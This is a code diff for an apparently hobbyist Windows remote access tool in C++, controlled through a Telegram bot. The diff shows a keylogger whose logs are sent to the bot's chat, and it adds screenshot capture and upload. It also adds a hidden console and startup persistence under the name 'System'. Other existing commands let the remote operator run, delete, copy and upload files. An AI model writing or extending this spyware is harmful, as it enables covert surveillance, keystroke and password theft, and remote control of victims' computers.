@@ -1,89 +1,28 @@
-﻿#include <iostream>
+#include <iostream>
 #include <tgbot/tgbot.h>
 #include <filesystem>
 #include <Shellapi.h>
 
-namespace fs = std::filesystem;
-const char* filename = "temp.txt";
-bool isKeyLoggerRunning = false;
-
-
-// KeyLogger function
-void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
-	using namespace std;
-	
-	while (isKeyLoggerRunning) 
-	{
-		ofstream outfile(filename, ios::app); // creating a file (if it does not already exist)
-
-		// Checking if there are problems with access to the file
-		if (!outfile)
-		{
-			bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
-			break;
-		}
-
-		for (int i = 0; i < 0xA3; i++)
-		{
-			// If a key was pressed...
-			if (GetAsyncKeyState(i) & 0b1)
-			{
-				if (i >= 0x30 && i <= 0x5A)     // keys 0-9 and 'A'-'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
-					outfile << (char)i;
-
-				else if (i == VK_RETURN)        // other keys
-					outfile << "[ENTER]";
-
-				else if (i == VK_BACK)
-					outfile << "[BACKSPACE]";
-
-				else if (i == VK_SPACE)
-					outfile << ' ';
-
-				else if (i == VK_SHIFT)
-					outfile << "[SHIFT]";
-
-				else if (i == VK_CONTROL)
-					outfile << "[CTRL]";
-			};
-		}
-		outfile.close();
-	}
-}
-
-
-// Function for conversion UTF-16 → UTF-8 (std::string → std::wstring)
-std::string wstringToUtf8(const std::wstring& wstr) {
-	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
-	std::string strTo(size_needed, 0);
-	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
-	return strTo;
-}
-
-
-// Function for conversion UTF-8 → UTF-16 (std::wstring → std::string)
-std::wstring utf8_to_wstring(const std::string& utf8_str) {
-	int size_needed = MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, NULL, 0);
-	if (size_needed == 0) {
-		return L"";
-	}
-	std::wstring wstr(size_needed - 1, 0);
-	MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, &wstr[0], size_needed);
-	return wstr;
-}
+#include "keyLogger.h"
+#include "globals.h"
+#include "console.h"
+#include "startup.h"
+#include "conversions.h"
+#include "screenshot.h"
 
 
 // Main function
-void startBot(std::string token) 
+void startBot(std::string token)
 {
 	using namespace std;
+	namespace fs = std::filesystem;
 
 	TgBot::Bot bot(token);
 
 	/*
-	If the current mode is empty, it means that this is a normal mode: 
-	we can write commands, but if it is not empty, it means that 
-	the program will not accept commands, but will accept what 
+	If the current mode is empty, it means that this is a normal mode:
+	we can write commands, but if it is not empty, it means that
+	the program will not accept commands, but will accept what
 	the mode is set to (path to folder, flags for executing subtasks, etc.)
 	*/
 	std::string currentMode = "";
@@ -106,6 +45,7 @@ void startBot(std::string token)
 				+ "/send_file_mode - opens send_file mode;\n"
 				+ "/upload_file_mode - opens upload_file mode;\n"
 				+ "/exit_mode - exits your current mode.\n");
+			bot.getApi().sendMessage(message->chat->id, "ChatID: " + std::to_string(message->chat->id));
 		}
 		else
 			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
@@ -115,7 +55,7 @@ void startBot(std::string token)
 
 	// Starting Key Logger
 	bot.getEvents().onCommand("start_key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
-		if (currentMode.empty()) 
+		if (currentMode.empty())
 		{
 			int64_t chat_id = message->chat->id;
 
@@ -144,7 +84,7 @@ void startBot(std::string token)
 
 	// Sending a file with Key Logger records
 	bot.getEvents().onCommand("send_key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
-		if (currentMode.empty()) 
+		if (currentMode.empty())
 		{
 			// Проверяем, не пустой ли файл
 			ifstream inFile(filename);
@@ -158,8 +98,30 @@ void startBot(std::string token)
 
 		});
 
-	
-	// Accepts russian symbols!
+
+	bot.getEvents().onCommand("send_scr", [&bot, &currentMode](TgBot::Message::Ptr message) {
+		if (currentMode.empty())
+		{	
+			try {
+				takeScreenshot(scrname);
+				TgBot::InputFile::Ptr document = TgBot::InputFile::fromFile(scrname, "image/bmp");
+
+				bot.getApi().sendDocument(message->chat->id, document);
+
+				if (fs::remove(scrname))
+					bot.getApi().sendMessage(message->chat->id, "Screenshot has been successfully deleted.");
+				else
+					bot.getApi().sendMessage(message->chat->id, "Cannot delete the screenshot.");
+			}
+			catch (const std::exception& e) {
+				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
+			}
+		}
+		else
+			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
+		});
+
+
 	bot.getEvents().onCommand("check_dir_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty())
 		{
@@ -171,7 +133,6 @@ void startBot(std::string token)
 		});
 
 
-	// Accepts russian symbols!
 	bot.getEvents().onCommand("start_file_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty())
 		{
@@ -183,7 +144,6 @@ void startBot(std::string token)
 		});
 
 
-	// Accepts russian symbols!
 	bot.getEvents().onCommand("delete_file_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
 		if (currentMode.empty())
 		{
@@ -230,6 +190,19 @@ void startBot(std::string token)
 		});
 
 
+	// Experimental, DO NOT USE - IT'S NOT WORKING FOR NOW!
+	bot.getEvents().onCommand("conversation_mode", [&bot, &currentMode, &isWaitingForSecondPath, &isWaitingForFile](TgBot::Message::Ptr message) {
+
+		if (currentMode.empty())
+		{
+			ShowConsole();
+			currentMode = "conversation";
+		}
+		else
+			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
+		});
+
+
 	// ALL messages from the user are processed here FIRST.
 	bot.getEvents().onAnyMessage([&bot, &currentMode, &isWaitingForSecondPath, &isWaitingForFile](TgBot::Message::Ptr message) {
 
@@ -240,7 +213,7 @@ void startBot(std::string token)
 			return;
 		}
 
-		
+
 		if (currentMode == "check_dir") {
 			std::string path = message->text;
 			std::wstring wpath = utf8_to_wstring(path);
@@ -264,29 +237,29 @@ void startBot(std::string token)
 		}
 
 
-		else if (currentMode == "start_file") 
+		else if (currentMode == "start_file")
 		{
 			string path = message->text;
 			wstring wpath = utf8_to_wstring(path);
 
-			if (fs::exists(wpath)) 
+			if (fs::exists(wpath))
 			{
 				// Starting the file with ShellExecuteW
 				HINSTANCE result = ShellExecuteW(NULL, L"open", wpath.c_str(), NULL, NULL, SW_SHOWNORMAL);
 
-				if ((intptr_t)result <= 32) 
+				if ((intptr_t)result <= 32)
 					bot.getApi().sendMessage(message->chat->id, "Error executing program.");
 
-				else 
+				else
 					bot.getApi().sendMessage(message->chat->id, "Program executed successfully.");
-					
+
 			}
 			else
 				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist.");
 		}
 
 
-		else if (currentMode == "delete_file") 
+		else if (currentMode == "delete_file")
 		{
 			string path = message->text;
 			wstring wpath = utf8_to_wstring(path);
@@ -300,7 +273,7 @@ void startBot(std::string token)
 			else
 				bot.getApi().sendMessage(message->chat->id, "Path is not a file or does not exist.");
 		}
-		
+
 
 		else if (currentMode == "copy_file")
 		{
@@ -310,7 +283,7 @@ void startBot(std::string token)
 			wstring wpath = utf8_to_wstring(path);
 
 
-			if (isWaitingForSecondPath) 
+			if (isWaitingForSecondPath)
 			{
 				tempPath = wpath;
 				bot.getApi().sendMessage(message->chat->id, "Send a path, where you want your file to be copied.");
@@ -359,7 +332,7 @@ void startBot(std::string token)
 			else {
 				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist or is not a file.");
 			}
-			}
+		}
 
 
 		else if (currentMode == "upload_file") {
@@ -406,18 +379,36 @@ void startBot(std::string token)
 				}
 				else
 					bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist or is not a directory.");
-				
+
 
 				isWaitingForFile = true;
 			}
 		}
 
 
+		// Experimental, DO NOT USE - IT'S NOT WORKING FOR NOW!
+		else if (currentMode == "conversation") {
+			try {
+				if (message->text == "wait") {
+					string input;
+					getline(cin, input);
+					bot.getApi().sendMessage(message->chat->id, input);
+				}
+				cout << message->text << endl;
+				bot.getApi().sendMessage(message->chat->id, "Your message sended successfully.");
+			}
+			catch (const std::exception& e) {
+				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
+			}
+
+		}
+
 		});
 
 
 	try {
 		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
+		bot.getApi().sendMessage(sashaId, "TgBot has been launched.");
 		TgBot::TgLongPoll longPoll(bot);
 		while (true) {
 			longPoll.start();
@@ -430,7 +421,11 @@ void startBot(std::string token)
 
 int main()
 {
+	// Hiding the console
+	HideConsole();
+
+	AddToStartup(L"System", L"path\\to\\your\\program.exe");
+
 	startBot("TOKEN");
-	
 	return 0;
 }
